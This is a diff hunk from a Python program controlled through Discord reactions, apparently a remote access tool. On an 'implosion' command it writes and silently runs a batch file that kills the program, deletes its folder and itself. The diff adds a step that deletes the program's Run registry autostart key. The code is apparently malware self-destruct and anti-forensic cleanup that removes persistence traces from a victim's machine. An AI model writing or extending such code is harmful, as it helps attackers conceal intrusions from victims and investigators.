@@ -194,7 +194,7 @@ async def on_reaction_add(reaction, user):
                     try: rmtree('rec_')
                     except: pass
                     with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
-                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
+                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\nset "regKey=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"\nset "regValue={software_registry_name}"\nreg delete "%regKey%" /v "%regValue%" /f >nul 2>&1\ndel "%~f0"')
                     subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                     sys.exit(0)
                 elif str(reaction) == '🔴' and expectation == 'implosion':
